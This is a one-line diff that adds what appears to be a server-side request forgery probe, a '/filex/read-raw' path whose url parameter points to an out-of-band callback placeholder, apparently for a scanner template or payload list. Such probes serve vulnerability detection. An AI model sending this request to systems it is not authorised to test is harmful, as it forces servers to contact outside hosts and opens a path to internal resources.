@@ -1,0 +1,1 @@
+/filex/read-raw?url=http://{{interactsh-url}}&cut=1
